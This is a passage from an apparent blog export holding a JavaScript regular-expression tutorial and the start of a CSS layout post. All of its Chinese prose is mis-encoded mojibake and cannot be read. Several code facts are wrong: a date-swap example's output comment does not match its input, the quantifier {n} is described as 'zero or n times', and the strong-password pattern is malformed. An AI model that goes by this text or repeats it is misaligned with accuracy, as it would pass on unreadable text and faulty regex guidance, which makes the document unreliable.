ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ã€‚è¯¥æ•°ç»„æ˜¯é€šè¿‡åœ¨ separator æŒ‡å®šçš„è¾¹ç•Œå¤„å°†å­—ç¬¦ä¸² stringObject åˆ†å‰²æˆå­ä¸²åˆ›å»ºçš„ã€‚è¿”å›žçš„æ•°ç»„ä¸­çš„å­—ä¸²ä¸åŒ…æ‹¬ separator è‡ªèº«ã€‚ ä½†æ˜¯ï¼Œå¦‚æžœ separator æ˜¯åŒ…å«å­è¡¨è¾¾å¼çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œé‚£ä¹ˆè¿”å›žçš„æ•°ç»„ä¸­åŒ…æ‹¬ä¸Žè¿™äº›å­è¡¨è¾¾å¼åŒ¹é…çš„å­—ä¸²ï¼ˆä½†ä¸åŒ…æ‹¬ä¸Žæ•´ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„æ–‡æœ¬ï¼‰ã€‚123456var split = function()&#123; text = &apos;a1b2c3d&apos; console.log(text.split(/\d/)); name = &quot;asfasdf,fadf./asdf.asdf[asdf&quot; console.log(name.split(/\W/));&#125;() è¯­æ³•å…ƒå­—ç¬¦( [ { \ ^ $ | ) ? * + . é¢„å®šä¹‰çš„ç‰¹æ®Šå­—ç¬¦ å­—ç¬¦ æè¿° \t åˆ¶è¡¨ç¬¦ \n æ¢è¡Œç¬¦ \r å›žè½¦ç¬¦ \f æ¢é¡µç¬¦ \a alertå­—ç¬¦ \e escapeå­—ç¬¦ \cX / ä¸ŽXç›¸å¯¹åº”çš„æŽ§åˆ¶å­—ç¬¦ \b ä¸Žå›žé€€å­—ç¬¦ \v åž‚ç›´åˆ¶è¡¨ç¬¦ \0 ç©ºå­—ç¬¦ åˆ†æžæ¡ä»¶ç»§ç»­åœ¨åˆ†ç»„ä¸Šåšæ–‡ç« ã€‚åœ¨åˆ†ç»„ä¸­æ’å…¥ç®¡é“ç¬¦ï¼ˆâ€œ|â€ï¼‰ï¼ŒæŠŠå®ƒåˆ’åˆ†ä¸ºä¸¤ä¸ªæˆ–å¤šä¸ªå€™å¤šé¡¹ã€‚1234var reg = /(red|black|yellow)!!/;alert(reg.test(&quot;red!!&quot;))//truealert(reg.test(&quot;black!!&quot;))//truealert(reg.test(&quot;yellow!!&quot;))//true è¾¹ç•Œä¸€ä¸ªè¦ä¸Žå­—ç¬¦ç±»åˆç”¨çš„ä¸œè¥¿ã€‚ è¾¹ç•Œ|æ­£åˆ™ |åç§°| æè¿°||â€”|â€”|â€”||^| å¼€å¤´| æ³¨æ„ä¸èƒ½ç´§è·ŸäºŽå·¦ä¸­æ‹¬å·çš„åŽé¢||$| ç»“å°¾||\b| å•è¯è¾¹ç•Œ| æŒ‡[a-zA-Z_0-9]ä¹‹å¤–çš„å­—ç¬¦||\B |éžå•è¯è¾¹ç•Œ |å•è¯è¾¹ç•Œä¸¾ä¾‹ã€‚è¦åŒ¹é…çš„ä¸œè¥¿çš„å‰ç«¯æˆ–æœªç«¯ä¸èƒ½ä¸ºè‹±æ–‡å­—æ¯é˜¿æ‹‰ä¼¯å­—æ•°å­—æˆ–ä¸‹æ¨ªçº¿ã€‚12var str = &quot;12w-eefd&amp;efrew&quot;;alert(str.match(/\b\w+\b/g))//12w,eefd,efrew å­—ç¬¦ç±»ç®€å•ç±»åŽŸåˆ™ä¸Šæ­£åˆ™çš„ä¸€ä¸ªå­—ç¬¦å¯¹åº”ä¸€ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨[]æŠŠå®ƒä»¬æ‹¬èµ·æ¥ï¼Œè®©[]è¿™ä¸ªæ•´ä½“å¯¹åº”ä¸€ä¸ªå­—ç¬¦ã€‚å¦‚12345alert(/abc/.test(&quot;abc&quot;));//truealert(/[abc]/.test(&quot;a&quot;));//truealert(/[abc]/.test(&quot;b&quot;));//truealert(/[abc]/.test(&quot;c&quot;));//truealert(&quot;a bat ,a Cat,a fAt bat ,a faT cat&quot;.match(/[bcf]at/gi));//bat,Cat,fAt,bat,faT,cat è´Ÿå‘ç±»åœ¨[]å‰é¢åŠ ä¸ªå…ƒå­—ç¬¦^è¿›è¡Œå–åï¼Œè¡¨ç¤ºåŒ¹é…ä¸èƒ½ä¸ºæ‹¬å·é‡Œé¢çš„å­—ç¬¦ã€‚1234alert(/[^abc]/.test(&quot;a&quot;));//falsealert(/[^abc]/.test(&quot;b&quot;));//falsealert(/[^abc]/.test(&quot;6&quot;));//truealert(/[^abc]/.test(&quot;gg&quot;));//true èŒƒå›´ç±»è¿˜æ˜¯åœ¨é‚£ä¸ªä¸­æ‹¬å·é‡Œé¢åšæ–‡ç« ã€‚æœ‰æ—¶åŒ¹é…çš„ä¸œè¥¿è¿‡å¤šï¼Œè€Œä¸”ç±»åž‹åˆç›¸åŒï¼Œå…¨éƒ¨è¾“å…¥å¤ªéº»çƒ¦ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å®ƒã€‚ç‰¹å¾å°±æ˜¯åœ¨ä¸­é—´åŠ äº†ä¸ªæ¨ªçº¿ã€‚12345alert(/[a-f]/.test(&quot;b&quot;));//truealert(/[a-f]/.test(&quot;g&quot;));//falsealert(/[a-z]/.test(&quot;h&quot;));//truealert(/[0-9]/.test(&quot;8&quot;));//truealert(/[0-9]/.test(&quot;a&quot;));//false ç»„åˆç±»ä¸­æ‹¬å·å†…å¯ä»¥ç»„åˆä½¿ç”¨ä¸åŒç±»åž‹çš„å•ä¸ªå­—ç¬¦ã€‚1234567alert(/[^H-Y]/.test(&quot;G&quot;));//truealert(/[^7-9]/.test(&quot;6&quot;));//truealert(/[a-m1-5\n]/.test(&quot;a&quot;))//truealert(/[a-m1-5\n]/.test(&quot;3&quot;))//truealert(/[a-m1-5\n]/.test(&quot;\n&quot;))//truealert(/[a-m1-5\n]/.test(&quot;r&quot;))//false é¢„å®šä¹‰ç±»ä½¿ç”¨åä¹‰å­—ç¬¦ä»£æ›¿æŸäº›å¸¸ç”¨çš„ç»„åˆé›† å­—ç¬¦ ç­‰åŒäºŽ æè¿° . [^\n\r] é™¤äº†æ¢è¡Œå’Œå›žè½¦ä¹‹å¤–çš„ä»»æ„å­—ç¬¦ \d [0-9] æ•°å­—å­—ç¬¦ \D [^0-9] éžæ•°å­—å­—ç¬¦ \s [ \t\n\x0B\f\r] ç©ºç™½å­—ç¬¦ \S [^ \t\n\x0B\f\r] éžç©ºç™½å­—ç¬¦ \w [a-zA-Z_0-9] å•è¯å­—ç¬¦(æ‰€æœ‰çš„å­—æ¯) \W [^a-zA-Z_0-9] éžå•è¯å­—ç¬¦ é‡è¯ï¼ˆé™å®šç¬¦ï¼‰ ä»£ç  æè¿° ? å‡ºçŽ°é›¶æ¬¡æˆ–ä¸€æ¬¡ * å‡ºçŽ°é›¶æ¬¡æˆ–å¤šæ¬¡(ä»»æ„æ¬¡) + å‡ºçŽ°ä¸€æ¬¡æˆ–å¤šæ¬¡ï¼ˆè‡³å°‘ä¸€æ¬¡ï¼‰ {n} å¯¹åº”é›¶æ¬¡æˆ–è€…næ¬¡ {n,m} è‡³å°‘å‡ºçŽ°næ¬¡ä½†ä¸è¶…è¿‡mæ¬¡ {n,} è‡³å°‘å‡ºçŽ°næ¬¡(+çš„å‡çº§ç‰ˆ) 1234567891011alert(/...../.test(&quot;æ­£åˆ™è¡¨è¾¾å¼&quot;))//truealert(/æ­£åˆ™è¡¨è¾¾å¼/.test(&quot;æ­£åˆ™è¡¨è¾¾å¼&quot;))//truealert(/[\u4e00-\u9fa5]&#123;5&#125;/.test(&quot;æ­£åˆ™è¡¨è¾¾å¼&quot;))//truealert(/[\u4e00-\u9fa5]&#123;4&#125;/.test(&quot;æ­£åˆ™è¡¨è¾¾å¼55&quot;))//truealert(/^[\u4e00-\u9fa5]+$/.test(&quot;æ­£åˆ™è¡¨è¾¾å¼&quot;))//truealert(/^[\u4e00-\u9fa5]+$/.test(&quot;æ­£åˆ™è¡¨è¾¾å¼#&quot;)) //falsealert(/\d&#123;6&#125;/.test(&quot;123456&quot;))//truealert(/[regx]&#123;2&#125;/.test(&quot;ee&quot;))//truealert(/[regx]&#123;2&#125;/.test(&quot;ex&quot;))//truealert(/[regx]&#123;2&#125;/.test(&quot;xx&quot;))//true 1/[\u4e00-\u9fa5]/ //ç”¨äºŽåŒ¹é…å•ä¸ªæ±‰å­—ã€‚è¿™ä¸¤ä¸ªunicodeå€¼æ­£å¥½æ˜¯Unicodeè¡¨ä¸­çš„æ±‰å­—çš„å¤´å’Œå°¾ã€‚ è´ªå©ªé‡è¯ï¼Œæ‡’æƒ°é‡è¯ä¸Žæ”¯é…æ€§é‡è¯è´ªå©ªé‡è¯: å½“æ­£åˆ™è¡¨è¾¾å¼ä¸­åŒ…å«èƒ½æŽ¥å—é‡å¤é‡è¯æ—¶ï¼Œé»˜è®¤çš„è¡Œä¸ºæ˜¯ï¼ˆåœ¨ä½¿æ•´ä¸ªè¡¨è¾¾å¼èƒ½å¾—åˆ°åŒ¹é…çš„å‰æä¸‹ï¼‰åŒ¹é…å°½å¯èƒ½å¤šçš„å­—ç¬¦ã€‚1alert(&quot;aabab&quot;.match(/a.*b/g))//aabab æ‡’æƒ°é‡è¯:åœ¨é‡è¯åŽåŠ ï¼Ÿï¼Œä¹Ÿå°±æ˜¯åŒ¹é…å°½å¯èƒ½å°‘çš„å­—ç¬¦ã€‚å…¶å·¥ä½œæ–¹å¼ä¸Žè´ªå©ªé‡è¯ç›¸åã€‚123alert(&quot;abaab&quot;.match(/a.*?b/g))//ä¸ºä»€ä¹ˆç¬¬ä¸€ä¸ªåŒ¹é…æ˜¯aabï¼ˆç¬¬ä¸€åˆ°ç¬¬ä¸‰ä¸ªå­—ç¬¦ï¼‰è€Œä¸æ˜¯abï¼ˆç¬¬äºŒåˆ°ç¬¬ä¸‰ä¸ªå­—ç¬¦ï¼‰ï¼Ÿç®€å•åœ°è¯´ï¼Œå› ä¸ºæ­£åˆ™è¡¨è¾¾å¼æœ‰å¦ä¸€æ¡è§„åˆ™ï¼Œæ¯”æ‡’æƒ°ï¼è´ªå©ªè§„åˆ™çš„ä¼˜å…ˆçº§æ›´é«˜ï¼šæœ€å…ˆå¼€å§‹çš„åŒ¹é…æ‹¥æœ‰æœ€é«˜çš„ä¼˜å…ˆæƒâ€”â€”The match that begins earliest winsã€‚ è¡¨5.æ‡’æƒ°é™å®šç¬¦|ä»£ç | æè¿°||â€”|â€”||*? |é‡å¤ä»»æ„æ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤||+?| é‡å¤1æ¬¡æˆ–æ›´å¤šæ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤||??| é‡å¤0æ¬¡æˆ–1æ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤||{n,m}?| é‡å¤nåˆ°mæ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤||{n,}? |é‡å¤næ¬¡ä»¥ä¸Šï¼Œä½†å°½å¯èƒ½å°‘é‡å¤| æ”¯é…æ€§é‡è¯ï¼Œåœ¨ç®€å•é‡è¯åŽåŠ +ã€‚æ”¯é…æ€§é‡è¯åªå°è¯•ä¸€æ¬¡ã€‚ä½†æ˜¯javascriptä¸æ”¯æŒã€‚ åˆ†ç»„åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬æŽ¥è§¦åˆ°ä¸­æ‹¬å·è¡¨ç¤ºèŒƒå›´å†…é€‰æ‹©ï¼Œå¤§æ‹¬å·è¡¨ç¤ºé‡å¤ã€‚å°æ‹¬å·å°±å¯ä»¥è¡¨ç¤ºåˆ†ç»„ï¼Œç”¨ä½œå¤šå­—ç¬¦çš„é‡å¤ã€‚ 123456789//åˆ†ç»„+é‡è¯alert(/(dog)&#123;2&#125;/.test(&quot;dogdog&quot;))//true//åˆ†ç»„+èŒƒå›´alert(&quot;baddad&quot;.match(/([bd]ad?)*?/g))//baddad,dad//åˆ†ç»„+åˆ†ç»„alert(&quot;mon and dad&quot;.match(/(mon( and dad)?)/))//mon and dad,mon and dad, and dad//man and dad æ˜¯ç¬¦åˆæ­£åˆ™æ¨¡å¼çš„ï¼Œè€Œ and dad æ˜¯æ­£åˆ™çš„ä¸€ä¸ªåˆ†ç»„] æ•èŽ·æ€§åˆ†ç»„æ‰€æœ‰åˆ†ç»„é»˜è®¤éƒ½æ˜¯æ•èŽ·æ€§åˆ†ç»„ï¼Œå½“ä½¿ç”¨matchæˆ–è€…execæ–¹æ³•ä¸å¸¦å…¨å±€å±žæ€§çš„æ—¶å€™ï¼Œå°±å¯ä»¥åœ¨è¿”å›žæ•°ç»„çš„ç¬¬1ä½å¼€å§‹æ•èŽ·åˆ°ç¬¦åˆåˆ†ç»„çš„å†…å®¹ã€‚123456789101112131415161718192021222324 var reg = /test(\d+)/; var str = &apos;test001 test002&apos;; console.log(str.match(reg));//[&quot;test001&quot;, &quot;001&quot;, index: 0, input: &quot;test001&quot;] var reg = /test(\d+)/g; var str = &apos;test001 test002&apos;; console.log(str.match(reg)); //[&quot;test001&quot;, &quot;test002&quot;] var reg = /test(\d)+/; var str = &apos;test001 test002&apos;; console.log(str.match(reg));//[&quot;test001&quot;, &quot;1&quot;, index: 0, input: &quot;test001&quot;] var reg = /test(\d)+/; var str = &apos;test001 test002&apos;; console.log(str.match(reg));//[&quot;test001&quot;, &quot;1&quot;, index: 0, input: &quot;test001&quot;]var reg = /test(\d)+?/; var str = &apos;test001 test002&apos;; console.log(str.match(reg));//[&quot;test0&quot;, &quot;0&quot;, index: 0, input: &quot;test001&quot;] åå‘å¼•ç”¨æ•èŽ·ä¼šè¿”å›žä¸€ä¸ªæ•èŽ·ç»„ï¼Œè¿™ä¸ªåˆ†ç»„æ˜¯ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œä¸ä»…å¯ä»¥åœ¨æ­£åˆ™è¡¨è¾¾å¼å¤–éƒ¨é€šè¿‡ç¨‹åºè¿›è¡Œå¼•ç”¨ï¼Œä¹Ÿå¯ä»¥åœ¨æ­£åˆ™è¡¨è¾¾å¼å†…éƒ¨è¿›è¡Œå¼•ç”¨ï¼Œè¿™ç§å¼•ç”¨æ–¹å¼å°±æ˜¯åå‘å¼•ç”¨ã€‚ åå‘å¼•ç”¨æ ‡è¯†ç”±æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„åŒ¹é…ç»„æ•èŽ·æ€§åˆ†ç»„ã€‚æ¯ä¸ªåå‘å¼•ç”¨éƒ½ç”±ä¸€ä¸ªç¼–å·æˆ–åç§°æ¥æ ‡è¯†ï¼Œå¹¶é€šè¿‡â€œ\ç¼–å·â€è¡¨ç¤ºæ³•è¿›è¡Œå¼•ç”¨ã€‚ï¼ˆMDNä¸æŽ¨èä½¿ç”¨ï¼‰123456789var color = &quot;#990000&quot;;/#(\d+)/.test(color);alert(RegExp.$1);//990000 alert(/(dog)\1/.test(&quot;dogdog&quot;))//true var num = &quot;1234 5678&quot;;var newNum = num.replace(/(\d&#123;4&#125;) (\d&#123;4&#125;)/,&quot;$2 $1&quot;);alert(newNum) ä½ ä¹Ÿå¯ä»¥è‡ªå·±æŒ‡å®šåˆ†ç»„çš„ç»„åã€‚è¦æŒ‡å®šä¸€ä¸ªåˆ†ç»„çš„ç»„åï¼Œè¯·ä½¿ç”¨è¿™æ ·çš„è¯­æ³•ï¼š(?&lt; name &gt;exp)è¿™æ ·å°±æŠŠè¿™éƒ¨åˆ†è¡¨è¾¾å¼çš„ç»„åæŒ‡å®šä¸ºWordäº†ã€‚è¦åå‘å¼•ç”¨è¿™ä¸ªåˆ†ç»„æ•èŽ·çš„å†…å®¹ï¼Œä½ å¯ä»¥ä½¿ç”¨\${name}æ¥è°ƒç”¨åŒ¹é…åˆ°çš„å†…å®¹ ä½¿ç”¨å°æ‹¬å·çš„æ—¶å€™ï¼Œè¿˜æœ‰å¾ˆå¤šç‰¹å®šç”¨é€”çš„è¯­æ³•ã€‚ä¸‹é¢åˆ—å‡ºäº†æœ€å¸¸ç”¨çš„ä¸€äº›ï¼š|ä»£ç | è¯´æ˜Ž||â€”|â€”||(exp) |åŒ¹é…exp,å¹¶æ•èŽ·æ–‡æœ¬åˆ°è‡ªåŠ¨å‘½åçš„ç»„é‡Œ||(?&lt; name >exp)| åŒ¹é…exp,å¹¶æ•èŽ·æ–‡æœ¬åˆ°åç§°ä¸ºnameçš„ç»„é‡Œï¼Œä¹Ÿå¯ä»¥å†™æˆ(?â€™nameâ€™exp)||(?:exp)| åŒ¹é…exp,ä¸æ•èŽ·åŒ¹é…çš„æ–‡æœ¬ï¼Œä¹Ÿä¸ç»™æ­¤åˆ†ç»„åˆ†é…ç»„å·| éžæ•èŽ·æ€§åˆ†ç»„å¹¶ä¸æ˜¯æ‰€æœ‰åˆ†ç»„éƒ½èƒ½åˆ›å»ºåå‘å¼•ç”¨ï¼Œæœ‰ä¸€ç§ç‰¹åˆ«çš„åˆ†ç»„ç§°ä¹‹ä¸ºéžæ•èŽ·æ€§åˆ†ç»„ï¼Œå®ƒæ˜¯ä¸ä¼šåˆ›å»ºåå‘å¼•ç”¨ã€‚åä¹‹ï¼Œå°±æ˜¯æ•èŽ·æ€§åˆ†ç»„ã€‚è¦åˆ›å»ºä¸€ä¸ªéžæ•èŽ·æ€§åˆ†ç»„ï¼Œåªè¦åœ¨åˆ†ç»„çš„å·¦æ‹¬å·çš„åŽé¢ç´§è·Ÿä¸€ä¸ªé—®å·ä¸Žå†’å·å°±è¡Œäº†ã€‚ä½¿ç”¨matchã€execæ–¹æ³•çš„æ—¶å€™å°±ä¸ä¼šæ•èŽ·åˆ°åˆ†ç»„çš„å†…å®¹ã€‚1234var reg = /test(?:\d)+/; var str = &apos;test001&apos;; console.log(str.match(reg));//[&quot;test001&quot;, index: 0, input: &quot;test001&quot;] é›¶å®½æ–­è¨€ æ–­è¨€ï¼šä¿—è¯çš„æ–­è¨€å°±æ˜¯â€œæˆ‘æ–­å®šä»€ä¹ˆä»€ä¹ˆâ€ï¼Œè€Œæ­£åˆ™ä¸­çš„æ–­è¨€ï¼Œå°±æ˜¯è¯´æ­£åˆ™å¯ä»¥æŒ‡æ˜Žåœ¨æŒ‡å®šçš„å†…å®¹çš„å‰é¢æˆ–åŽé¢ä¼šå‡ºçŽ°æ»¡è¶³æŒ‡å®šè§„åˆ™çš„å†…å®¹.æ„æ€æ­£åˆ™ä¹Ÿå¯ä»¥åƒäººç±»é‚£æ ·æ–­å®šä»€ä¹ˆä»€ä¹ˆï¼Œæ¯”å¦‚â€ss1aa2bb3â€,æ­£åˆ™å¯ä»¥ç”¨æ–­è¨€æ‰¾å‡ºaa2å‰é¢æœ‰bb3ï¼Œä¹Ÿå¯ä»¥æ‰¾å‡ºaa2åŽé¢æœ‰ss1. é›¶å®½ï¼šå°±æ˜¯æ²¡æœ‰å®½åº¦ï¼Œåœ¨æ­£åˆ™ä¸­ï¼Œæ–­è¨€åªæ˜¯åŒ¹é…ä½ç½®ï¼Œä¸å å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒåŒ¹é…ç»“æžœé‡Œæ˜¯ä¸ä¼šè¿”å›žæ–­è¨€æœ¬èº«ã€‚ æ­£åˆ™ åç§° æè¿° (?=exp) æ­£å‘å‰çž» åŒ¹é…expå‰é¢çš„ä½ç½® (?!exp) è´Ÿå‘å‰çž» åŒ¹é…åŽé¢ä¸æ˜¯expçš„ä½ç½® (?&lt;=exp) æ­£å‘åŽçž» åŒ¹é…expåŽé¢çš„ä½ç½® JavaScriptä¸æ”¯æŒ (?&lt;!exp) è´Ÿå‘åŽçž» åŒ¹é…å‰é¢ä¸æ˜¯expçš„ä½ç½® JavaScriptä¸æ”¯æŒ æ­£å‘å‰çž»ç”¨æ¥æ£€æŸ¥æŽ¥ä¸‹æ¥çš„å‡ºçŽ°çš„æ˜¯ä¸æ˜¯æŸä¸ªç‰¹å®šçš„å­—ç¬¦é›†ã€‚è€Œè´Ÿå‘å‰çž»åˆ™æ˜¯æ£€æŸ¥æŽ¥ä¸‹æ¥çš„ä¸åº”è¯¥å‡ºçŽ°çš„ç‰¹å®šå­—ç¬¦ä¸²é›†ã€‚é›¶å®½æ–­è¨€æ˜¯ä¸ä¼šè¢«æ•èŽ·çš„ã€‚ 123456789101112var str1 = &quot;bedroom&quot;;var str2 = &quot;bedding&quot;;var reBed = /(bed(?=room))///åœ¨æˆ‘ä»¬æ•èŽ·bedè¿™ä¸ªå­—ç¬¦ä¸²æ—¶ï¼ŒæŠ¢å…ˆåŽ»çœ‹æŽ¥ä¸‹æ¥çš„å­—ç¬¦ä¸²æ˜¯ä¸æ˜¯roomalert(reBed.test(str1));//truealert(RegExp.$1)//bedalert(RegExp.$2 === &quot;&quot;)//truealert(reBed.test(str2))//falsevar str1 = &quot;bedroom&quot;;var str2 = &quot;bedding&quot;;var reBed = /(bed(?!room))/ //è¦æ¥å®ƒåŽé¢ä¸èƒ½æ˜¯roomalert(reBed.test(str1))//falsealert(reBed.test(str2))//true å°ç»ƒä¹ æ£€éªŒQQå·ç ï¼š [1-9][0-9]{4,14} æ‰‹æœºå·ç ï¼š^(13[0-9]|14[57]|15[0-35-9]|18[0-35-9])\d{8}$ èº«ä»½è¯ï¼š^([0-9]){7,18}(x|X)?$ å¯†ç ï¼š^[a-zA-Z]\w{5,17}$ å­—æ¯å¼€å¤´ï¼Œé•¿åº¦åœ¨6~18ä¹‹é—´ï¼Œåªèƒ½åŒ…å«å­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿ å¼ºå¯†ç ï¼š^(?=.\d)(?=.[a-z])(?=.*[A-Z]).{8,10}$ åŒ…å«å¤§å°å†™å­—æ¯å’Œæ•°å­—çš„ç»„åˆï¼Œä¸èƒ½ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦ï¼Œé•¿åº¦åœ¨8-10ä¹‹é—´ç”µè¯å·ç éªŒè¯ç /^[a-zA-z0-9]{4}$]/IPåœ°å€é‚®ç®±ç½‘å€ å•è¯é¦–å­—æ¯å¤§å†™1234567var a = &quot;asdf&quot;; String.prototype.capitalize = function () &#123; return this.replace(/^\w/, function (s) &#123; return s.toUpperCase(); &#125;); &#125;alert(a.capitalize())//Asdf 12345678910111213var replace = function()&#123; var text = &quot;javascript Tutorial&quot;; console.log(text.replace(/\S/ig, &apos;($&amp;)&apos;));&#125;() var replace = function()&#123; var name = &quot;Doe, John&quot;; console.log(name.replace(/(\w+)\s*, \s*(\w+)/, &quot;$2 $1&quot;)); var str = &apos;aaa bbb ccc&apos;; console.log(str.replace(/\b\w+\b/g, function(word)&#123; return word.substring(0,1).toUpperCase()+word.substring(1);&#125; )) &#125;() æœˆæ—¥å¹´å˜æ—¥æœˆå¹´12345&quot;04-22-2018&quot;.replace(/(?&lt;month&gt;\d&#123;2&#125;)-(?&lt;day&gt;\d&#123;2&#125;)-(?&lt;year&gt;\d&#123;4&#125;)/, (...args) =&gt; &#123; const groups = args.slice(-1)[0] const &#123;day, month, year&#125; = groups return `$&#123;day&#125;-$&#123;month&#125;-$&#123;year&#125;`&#125;) // &quot;25-04-2017&quot; é¢˜ç›®ï¼Œç§»é™¤æ‰€æœ‰æ ‡ç­¾ï¼Œåªç•™ä¸‹innerText!123var html = &quot;&lt;p&gt;&lt;a href=&apos;http://www.cnblogs.com/rubylouvre/&apos;&gt;Ruby Louvre&lt;/a&gt;by &lt;em&gt;æ­£åˆ™è¡¨è¾¾å¼&lt;/em&gt;&lt;/p&gt;&quot;;var text = html.replace(/&lt;(.|\s)*?&gt;/g, &quot;&quot;);alert(text)//Ruby Louvreby æ­£åˆ™è¡¨è¾¾å¼ å®˜æ–¹æ•™ç¨‹å¾®è½¯ï¼š.NET æ­£åˆ™è¡¨è¾¾å¼MSDNW3CSCHOOL æ­£åˆ™è¡¨è¾¾å¼åŸºæœ¬è¯­æ³• å‚è€ƒèµ„æ–™æ­£åˆ™è¡¨è¾¾å¼30åˆ†é’Ÿå…¥é—¨æ•™ç¨‹JavaScript æ­£åˆ™è¡¨è¾¾å¼ä¸Šâ€”â€”åŸºæœ¬è¯­æ³•JavaScriptæ­£åˆ™è¡¨è¾¾å¼ä¸‹â€”â€”ç›¸å…³æ–¹æ³•jsæ­£åˆ™è¡¨è¾¾å¼/replaceæ›¿æ¢å˜é‡æ–¹æ³•65æ¡æœ€å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼ ä½ è¦çš„éƒ½åœ¨è¿™é‡Œäº†JavaScript replace() æ–¹æ³•JavaScript split() æ–¹æ³•ã€javascriptæ­£åˆ™è¡¨è¾¾å¼JS æ­£åˆ™ä¸­çš„å‘½åæ•èŽ·åˆ†ç»„javascriptæ­£åˆ™è¡¨è¾¾å¼ä¸­åˆ†ç»„è¯¦è§£patternâ€“HTML5çš„è¡¨å•éªŒè¯å±žæ€§ https://zhuanlan.zhihu.com/p/83876910?utm_source=qq&amp;utm_medium=social&amp;utm_oi=549346247203553280]]></content>
      <categories>
        <category>Algorithms</category>
      </categories>
      <tags>
        <tag>Algorithms</tag>
        <tag>RegExp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å„ç§æ–¹å¼è¿›è¡Œç½‘é¡µå¸ƒå±€]]></title>
    <url>%2F2018%2F05%2F03%2Flayouts%2F</url>
    <content type="text"><![CDATA[å‰è¨€ ç½‘é¡µå¸ƒå±€ é™æ€å¸ƒå±€æ„æ€å°±æ˜¯åªæ˜¯é’ˆå¯¹æŸä¸ªå±å¹•ä¸‹è®¾è®¡çš„ç½‘é¡µï¼Œå½“å±å¹•å¤§å°æ”¹å˜æ—¶ï¼Œé¡µé¢å¸ƒå±€ä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼Œå°±åƒç»å¸¸æ‰€çœ‹åˆ°çš„æ»šåŠ¨æ¡ã€‚ è‡ªé€‚åº”å¸ƒå±€ç‰¹ç‚¹æ˜¯åˆ†åˆ«ä¸ºä¸åŒçš„å±å¹•è®¾ç½®å¸ƒå±€æ ¼å¼ï¼Œå½“å±å¹•å¤§å°æ”¹å˜æ—¶ï¼Œä¼šå‡ºçŽ°ä¸åŒçš„å¸ƒå±€ï¼Œæ„æ€å°±æ˜¯åœ¨è¿™ä¸ªå±å¹•ä¸‹è¿™ä¸ªå…ƒç´ å—åœ¨è¿™ä¸ªåœ°æ–¹ï¼Œä½†æ˜¯åœ¨é‚£ä¸ªå±å¹•ä¸‹ï¼Œè¿™ä¸ªå…ƒç´ å—åˆä¼šå‡ºçŽ°åœ¨é‚£ä¸ªåœ°æ–¹ã€‚åªæ˜¯å¸ƒå±€æ”¹å˜ï¼Œå…ƒç´ ä¸å˜ã€‚å¯ä»¥çœ‹æˆæ˜¯ä¸åŒå±å¹•ä¸‹ç”±å¤šä¸ªé™æ€å¸ƒå±€ç»„æˆçš„ã€‚ ä½¿ç”¨äº†åª’ä½“æŸ¥è¯¢1&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; æµå¼å¸ƒå±€ç‰¹ç‚¹æ˜¯éšç€å±å¹•çš„æ”¹å˜ï¼Œé¡µé¢çš„å¸ƒå±€æ²¡æœ‰å‘ç”Ÿå¤§çš„å˜åŒ–ï¼Œå¯ä»¥è¿›è¡Œé€‚é…è°ƒæ•´ï¼Œè¿™ä¸ªæ­£å¥½ä¸Žè‡ªé€‚åº”å¸ƒå±€ç›¸è¡¥ã€‚ PCç«¯å¸¸è§å¸ƒå±€ æµ®åŠ¨å¸ƒå±€floatBFC å³ Block Formatting Contexts (å—çº§æ ¼å¼åŒ–ä¸Šä¸‹æ–‡)Formatting context(æ ¼å¼åŒ–ä¸Šä¸‹æ–‡) æ˜¯ W3C CSS2.1 è§„èŒƒä¸­çš„ä¸€ä¸ªæ¦‚å¿µã€‚å®ƒæ˜¯é¡µé¢ä¸­çš„ä¸€å—æ¸²æŸ“åŒºåŸŸï¼Œå¹¶ä¸”æœ‰ä¸€å¥—æ¸²æŸ“è§„åˆ™ï¼Œå®ƒå†³å®šäº†å…¶å­å…ƒç´ å°†å¦‚ä½•å®šä½ï¼Œä»¥åŠå’Œå…¶ä»–å…ƒç´ çš„å…³ç³»å’Œç›¸äº’ä½œç”¨ã€‚å…·æœ‰ BFC ç‰¹æ€§çš„å…ƒç´ å¯ä»¥çœ‹ä½œæ˜¯éš”ç¦»äº†çš„ç‹¬ç«‹å®¹å™¨ï¼Œå®¹å™¨é‡Œé¢çš„å…ƒç´ ä¸ä¼šåœ¨å¸ƒå±€ä¸Šå½±å“åˆ°å¤–é¢çš„å…ƒç´ ï¼Œå¹¶ä¸” BFC å…·æœ‰æ™®é€šå®¹å™¨æ‰€æ²¡æœ‰çš„ä¸€äº›ç‰¹æ€§ã€‚ åªè¦å…ƒç´ æ»¡è¶³ä¸‹é¢ä»»ä¸€æ¡ä»¶å³å¯è§¦å‘ BFC ç‰¹æ€§ï¼š body æ ¹å…ƒç´  æµ®åŠ¨å…ƒç´ ï¼šfloat é™¤ none ä»¥å¤–çš„å€¼ ç»å¯¹å®šä½å…ƒç´ ï¼šposition (absoluteã€fixed) display ä¸º inline-blockã€table-cellsã€flex overflow é™¤äº† visible ä»¥å¤–çš„å€¼ (hiddenã€autoã€scroll) ç‰¹æ€§ åŒä¸€ä¸ª BFC ä¸‹å¤–è¾¹è·ä¼šå‘ç”ŸæŠ˜å  BFC å¯ä»¥åŒ…å«æµ®åŠ¨çš„å…ƒç´ ï¼ˆæ¸…é™¤æµ®åŠ¨ï¼Œä½¿æµ®åŠ¨åœ¨BFCç›’å­å†…ï¼‰ BFC å¯ä»¥é˜»æ­¢å…ƒç´ 